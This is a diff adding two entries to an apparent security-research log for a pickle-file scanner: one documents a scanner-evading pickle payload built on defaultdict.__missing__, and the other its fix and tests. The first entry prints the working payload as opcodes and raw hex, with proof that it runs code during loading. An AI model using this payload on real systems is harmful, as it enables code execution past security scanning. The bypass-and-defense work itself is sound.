@@ -15927,3 +15927,199 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3764 passed, 1022 skipped, 21 warnings in 37.61s`.
+
+## Turn 253 - Bypass via direct `defaultdict.__missing__` factory invocation
+
+Found another scanner-clean RCE-capable bypass in the stored-callback family.
+The native model tracks `collections.defaultdict(help)` as a `DefaultDict`
+value and already models some missing-key lookups, but a direct method
+descriptor call to `collections.defaultdict.__missing__` invokes the stored
+factory without being modeled.
+
+The payload constructs `collections.defaultdict(builtins.help)`, memoizes it,
+then invokes `collections.defaultdict.__missing__(defaultdict_obj, "missing")`.
+At runtime, `__missing__` calls the default factory with zero arguments;
+`help()` runs, enters `_sitebuiltins._Helper.__call__`, and imports `pydoc`. A
+shadow `pydoc.py` at the front of `sys.path` executes during `pickle.loads` and
+returns `"factory-value"`, which becomes the pickle result.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL collections defaultdict
+STACK_GLOBAL builtins help
+TUPLE1
+REDUCE              # defaultdict(help)
+MEMOIZE
+POP
+STACK_GLOBAL collections defaultdict.__missing__
+MARK
+BINGET 0
+SHORT_BINUNICODE "missing"
+TUPLE
+REDUCE              # defaultdict.__missing__(dd, "missing")
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0b636f6c6c656374696f6e738c0b64656661756c7464696374938c086275696c74696e738c0468656c7093855294308c0b636f6c6c656374696f6e738c1764656661756c74646963742e5f5f6d697373696e675f5f932868008c076d697373696e6774522e
+```
+
+Scanner proof:
+
+```text
+payload_len 104
+scan clean findings 0 errors ()
+imports [
+  ('collections', 'defaultdict', None, None),
+  ('builtins', 'help', None, None),
+  ('collections', 'defaultdict.__missing__', None, None),
+]
+invocations [
+  ('collections', 'defaultdict', 1, 47),
+  ('collections', 'defaultdict.__missing__', 2, 102),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result 'factory-value'
+runtime_type str
+marker_exists True
+marker_text owned-by-defaultdict-missing
+runtime stderr
+```
+
+Why it bypasses:
+
+- Native policy does not mark `collections.defaultdict`,
+  `collections.defaultdict.__missing__`, or `builtins.help` as dangerous.
+- The native stack model correctly records `collections.defaultdict(help)` as a
+  `StackValue::DefaultDict` with `builtins.help` as its factory.
+- `defaultdict_factory_invocations(...)` only emits the hidden factory
+  invocation for `operator.getitem(defaultdict_obj, key)`.
+- Format-map paths also model missing-key lookup, but the direct
+  `collections.defaultdict.__missing__` method descriptor is not covered.
+- The Python call graph already knows an invoked `builtins.help()` reaches
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__`, but native metadata
+  never emits that zero-argument factory invocation.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Related probe:
+
+- `collections.defaultdict.__getitem__(defaultdict_obj, "missing")` also
+  invoked the factory and wrote the shadow `pydoc.py` marker, but the current
+  scanner already returned `suspicious` for that method name. The clean
+  representative is the direct `__missing__` descriptor.
+
+Likely source-level defense:
+
+- Extend native defaultdict factory modeling to direct method descriptors:
+  `collections.defaultdict.__missing__(defaultdict_obj, key)` should emit the
+  stored factory as a synthetic zero-argument invocation.
+- Consider covering `collections.defaultdict.__getitem__` and
+  `builtins.dict.__getitem__` on tracked `DefaultDict` values in the same helper
+  so suspicious-but-not-malicious lookup paths become critical when the factory
+  reaches an RCE sink.
+- Keep the defense stack-local and arity-specific: inspect only the reducer
+  callable and the already-decoded argument list.
+
+Performance note:
+
+- Payload size is 104 bytes.
+- Warm scan median over 1000 runs was `0.000062s`, p95 `0.000071s`, and max
+  `0.000348s`.
+- A fix only needs to inspect direct `defaultdict` method invocations over
+  already-tracked `DefaultDict` stack values.
+
+## Turn 254 - Defense for direct defaultdict factory lookups
+
+Blocked the Turn 253 `collections.defaultdict.__missing__` bypass at the
+native stored-callback source. The existing stack model already represented
+`collections.defaultdict(factory)` as `StackValue::DefaultDict`; the fix extends
+the one factory-invocation hook to direct method descriptors over that tracked
+value.
+
+Implementation:
+
+- Broadened `defaultdict_factory_invocations(...)` from only
+  `operator.getitem(defaultdict_obj, key)` to a small lookup predicate.
+- Covered `collections.defaultdict.__missing__(defaultdict_obj, key)`.
+- Covered related direct lookup descriptors:
+  `collections.defaultdict.__getitem__(defaultdict_obj, key)` and
+  `builtins.dict.__getitem__(defaultdict_obj, key)`.
+- All supported lookup shapes require exactly a tracked `DefaultDict` receiver
+  plus one key argument, then emit the stored default factory as a synthetic
+  zero-argument invocation.
+
+Regression coverage:
+
+- Added `test_scan_bytes_blocks_defaultdict_method_factory_rce`.
+- Covered the clean representative `collections.defaultdict.__missing__`.
+- Covered `collections.defaultdict.__getitem__` and `builtins.dict.__getitem__`
+  so suspicious-but-not-malicious paths become critical when the factory reaches
+  an RCE sink.
+- Each case verifies factory construction alone remains clean, the lookup
+  payload is malicious, the report includes a hidden zero-argument
+  `builtins.help` invocation, and a child interpreter writes the shadow
+  `pydoc.py` marker during `pickle.loads`.
+
+Post-fix proof for the exact Turn 253 payload:
+
+```text
+payload_len 104
+scan malicious findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [
+  ('collections', 'defaultdict', None, None),
+  ('builtins', 'help', None, None),
+  ('collections', 'defaultdict.__missing__', None, None),
+]
+invocations [
+  ('collections', 'defaultdict', 1, 47),
+  ('collections', 'defaultdict.__missing__', 2, 102),
+  ('builtins', 'help', 0, 102),
+]
+runtime rc 0
+runtime_result 'factory-value'
+runtime_type str
+marker_exists True
+marker_text owned-by-defaultdict-missing
+runtime stderr
+timing_median 0.000127
+timing_p95 0.000132
+timing_max 0.000218
+```
+
+Performance note:
+
+- The added predicate is stack-local and arity-specific.
+- It inspects only the reducer callable and the already-decoded two-argument
+  list.
+- Warm median for the fixed 104-byte payload was `0.000127s` over 1000 runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused defaultdict factory regressions: `4 passed in 0.43s`.
+- Focused import/call-graph regression file: `52 passed in 1.86s`.
+- Focused call-graph suite: `90 passed in 3.56s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.41s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3767 passed, 1022 skipped, 21 warnings in 40.14s`.
